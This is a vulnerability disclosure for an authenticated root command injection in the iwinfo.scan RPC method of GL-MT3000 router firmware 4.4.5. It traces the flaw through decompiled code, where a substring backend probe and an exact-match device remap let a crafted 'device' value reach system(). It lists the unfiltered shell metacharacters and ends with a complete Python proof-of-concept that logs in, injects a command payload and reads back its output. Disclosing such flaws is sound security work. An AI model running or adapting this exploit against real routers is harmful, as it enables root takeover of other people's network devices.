Submission Date: 2026.5.10
Vendor: GL-MT3000
Version: 4.4.5
Firmware: openwrt-mt3000-4.4.5-0811-1691754744.tar
Download Link: https://dl.gl-inet.cn/router/mt3000/stable


An authenticated command injection vulnerability exists in the `iwinfo.scan` ubus RPC method of the affected product. The `iwinfo.so` plugin exposed by rpcd accepts a `device` parameter that undergoes only blobmsg type validation (BLOBMSG_TYPE_STRING). The raw parameter is passed through `iwinfo_backend()` into `libiwinfo.so`, where the MTK backend probe uses `strstr()` substring matching to select the backend, but the device remapping logic inside the MTK scan function uses `strcmp()` exact matching. An attacker can craft a device string that passes the substring probe but fails the exact remap, causing the raw payload to flow directly into `sprintf(buf, "iwpriv %s set SiteSurvey=", device)` followed by `system(buf)`, resulting in root command execution.

The reported vulnerable flow is:

```text
Authenticated attacker
  -> POST /rpc calls ubus iwinfo scan {"device":"ra0; <cmd>; #"}
  -> rpcd dispatches to iwinfo.so method table: "scan" -> scan_handler (sub_2844)

  -> scan_handler -> parse_msg(msg):
       blobmsg_parse(&policy_device, 1, &out, msg+1, ...)
       policy_device: { name: "device", type: BLOBMSG_TYPE_STRING (3) }
       // NO content validation — only checks that "device" is a string

  -> sub_1038(out):
       qword_15110 = blobmsg_get_string(out)  // raw device stored
       qword_15108 = iwinfo_backend()         // selects backend ops

  -> iwinfo_backend("ra0; <cmd>; #"):
       iterates off_22A18: nl80211 -> mtk -> wext
         [0] nl80211 probe: not matched
         [1] mtk probe = sub_C150:
               strstr("ra0; <cmd>; #", "ra") -> TRUE  // substring match!
               returns mtk_ops
       qword_15108 = mtk_ops

  -> scan_handler -> sub_2534(ctx, req):
       (*(mtk_ops + 0xE0))(qword_15110, buf, &count)
       // mtk_ops[0xe0] = sub_C458, qword_15110 = raw device

  -> sub_C458("ra0; <cmd>; #", ...):
       strcmp("ra0; <cmd>; #", "mt798111") -> FALSE (no remap)
       strcmp("ra0; <cmd>; #", "mt7628")   -> FALSE (no remap)
       strcmp("ra0; <cmd>; #", "mt798112") -> FALSE (no remap)
       // device NOT remapped — stays as raw payload

       sprintf(s, "iwpriv %s set SiteSurvey=", device)
       system(s)
       // /bin/sh -c "iwpriv ra0; <cmd>; # set SiteSurvey="
       //               ----------   ------   -------------------
       //               no-op        RCE      commented out
```

rpcd loads `iwinfo.so` from `/usr/lib/rpcd/` on startup via `dlopen()/dlsym()`. The `rpc_plugin` symbol's `init` callback (offset +0x10) calls `ubus_add_object()`, which registers the method table. The `scan` entry in the method table maps to `scan_handler`:

![image-20260510195242170](image/image-20260510195242170.png)

The `scan` method's policy validates only the parameter type (BLOBMSG_TYPE_STRING = 3), with no content sanitization:

![image-20260510200141191](image/image-20260510200141191.png)

```
policy: { name: "device", type: BLOBMSG_TYPE_STRING (3) }
```

The `iwinfo_backend()` function is the backend selector in `libiwinfo.so`. It iterates three backend ops entries in order, calling each backend's probe function at ops[1]:

```c
char **__fastcall iwinfo_backend(__int64 device)
{
    for ( int i = 0; i < 3; i++ ) {
        char **ops = off_22A18[i];      // [0]=nl80211, [1]=mtk, [2]=wext
        if ( ops[1](device) )           // call probe function
            return ops;                 // return first match
    }
    return NULL;
}
```

The backend ops table at `off_22A18`:

```
off_22A18[0] -> { name: "nl80211", probe: sub_8BD0  }
off_22A18[1] -> { name: "mtk",     probe: sub_C150  }  <-- strstr probe
off_22A18[2] -> { name: "wext",    probe: sub_4DD0  }
```

The MTK backend probe (`sub_C150`) uses `strstr()` — substring matching — to detect supported devices:

```c
__int64 __fastcall sub_C150(char *haystack)
{
    const char **table = &mt798112;         // table: "mt798112","mt798111","ra",...
    while ( *table ) {
        if ( strstr(haystack, *table) )     // <-- substring match
            return 1;
        table += 2;
    }
    return 0;
}
```

When `iwinfo_backend()` returns `mtk_ops`, the scan dispatcher `sub_2534` reads the scan callback at offset +0xE0 from the ops structure and calls it with the raw device string:

```c
// sub_2534
if ( !(*(mtk_ops + 0xE0))(qword_15110, buf, &count) ) {
    // ... parse scan results, build ubus response ...
}
```

The screenshot below confirms that `mtk_ops + 0xE0` holds the pointer to `sub_C458`:

![image-20260510202812233](image/image-20260510202812233.png)

Inside `sub_C458` (the MTK scan implementation), device remapping uses `strcmp()` — exact matching — so non-matching device names are NOT remapped and flow unchanged into `sprintf()` + `system()`:

```c
__int64 __fastcall sub_C458(const char *device, ...)
{
    ...
    if ( !strcmp(device, "mt798111") || !strcmp(device, "mt7628") )
        device = "ra0";                          // exact match -> remap
    else if ( !strcmp(device, "mt798112") )
        device = "rax0";                         // exact match -> remap
    // non-matching -> device stays raw!
    ...
    sprintf(s, "iwpriv %s set SiteSurvey=", device);   // sink
    system(s);                                          // RCE
}
```

The root cause is the semantic mismatch between the two stages:

| Stage | Function | Matching | Input "ra0;id#" |
|-------|----------|----------|-----------------|
| Backend probe | sub_C150 | `strstr()` substring | "ra" found -> select MTK |
| Device remap | sub_C458 | `strcmp()` exact | no match -> raw payload passes through |
| Command exec | sub_C458 | `sprintf+system` | RCE |

The following dangerous characters are NOT filtered and pass through to `system()`:

| Character | Shell behavior | Impact |
|-----------|---------------|--------|
| `;` | Command separator | Execute arbitrary commands |
| `\|` | Pipe | Chain commands |
| `` ` `` | Command substitution | Nested command execution |
| `$()` | Command substitution | Nested command execution |
| `#` | Comment | Hide trailing arguments |
| `&&` / `\|\|` | Conditional execution | Conditional command execution |
| `>` / `>>` | Redirect | Write output to arbitrary files |

Exploit the vulnerability by sending a crafted ubus call:

```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import json
import ssl
import subprocess
import time
import urllib.error
import urllib.request


class GLInetError(RuntimeError):
    pass


class GLInetClient:
    def __init__(self, base_url: str, username: str, password: str, timeout: int = 15, verify_ssl: bool = False):
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.sid: str | None = None
        self._ssl_context = ssl.create_default_context() if verify_ssl else ssl._create_unverified_context()

    def _open(self, req: urllib.request.Request) -> bytes:
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_context) as resp:
                return resp.read()
        except urllib.error.HTTPError as exc:
            raise GLInetError(f"HTTP {exc.code}: {exc.read().decode(errors='replace')}") from exc
        except urllib.error.URLError as exc:
            raise GLInetError(f"Connection failed: {exc}") from exc

    def _post_json(self, path: str, obj: dict) -> dict:
        req = urllib.request.Request(
            f"{self.base_url}{path}",
            data=json.dumps(obj).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        return json.loads(self._open(req).decode())

    def login(self) -> str:
        challenge = self._post_json(
            "/rpc",
            {"jsonrpc": "2.0", "id": 1, "method": "challenge", "params": {"username": self.username}},
        )
        if "error" in challenge:
            raise GLInetError(f"challenge failed: {challenge['error']}")
        salt = challenge["result"]["salt"]
        nonce = challenge["result"]["nonce"]
        crypt_pw = subprocess.check_output(["openssl", "passwd", "-1", "-salt", salt, self.password], text=True).strip()
        digest = hashlib.md5(f"{self.username}:{crypt_pw}:{nonce}".encode()).hexdigest()
        login = self._post_json(
            "/rpc",
            {"jsonrpc": "2.0", "id": 2, "method": "login", "params": {"username": self.username, "hash": digest}},
        )
        if "error" in login:
            raise GLInetError(f"login failed: {login['error']}")
        self.sid = login["result"]["sid"]
        return self.sid

    def ensure_login(self) -> str:
        return self.sid or self.login()

    def rpc_call(self, obj: str, method: str, args: dict | None = None) -> dict:
        resp = self._post_json(
            "/rpc",
            {"jsonrpc": "2.0", "id": 3, "method": "call", "params": [self.ensure_login(), obj, method, args or {}]},
        )
        if "error" in resp:
            raise GLInetError(f"rpc call failed: {resp['error']}")
        return resp.get("result", {})


def main() -> int:
    parser = argparse.ArgumentParser(description="PoC: iwinfo.scan command injection via system()")
    parser.add_argument("--base-url", default="http://192.168.8.1")
    parser.add_argument("--username", default="root")
    parser.add_argument("--password", default="12345678Q!")
    parser.add_argument("--device-prefix", default="ra0", help="Device prefix that passes strstr probe")
    parser.add_argument("--cmd", default="id", help="Command to execute")
    parser.add_argument("--wait", type=float, default=3.0, help="Seconds to wait")
    args = parser.parse_args()

    client = GLInetClient(args.base_url, args.username, args.password)
    sid = client.login()

    stamp = str(int(time.time()))
    out_file = f"/tmp/poc_iwinfo_{stamp}.out"
    payload = f"{args.device_prefix}; rm -f {out_file}; {args.cmd} > {out_file} 2>&1; #"

    print(f"[+] sid       : {sid}")
    print(f"[+] payload   : {payload}")

    result = client.rpc_call("iwinfo", "scan", {"device": payload})
    print(f"[+] scan result: {result}")

    time.sleep(args.wait)

    try:
        dl = client._post_json("/rpc", {
            "jsonrpc": "2.0", "id": 4, "method": "call",
            "params": [sid, "file", "read", {"path": out_file}],
        })
        if "result" in dl:
            print(f"[+] command output:\n{dl['result']}")
            return 0
    except GLInetError:
        pass

    print(f"[+] check {out_file} manually on the device")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

The exploitation is shown below.

![image-20260510214915662](image/image-20260510214915662.png)

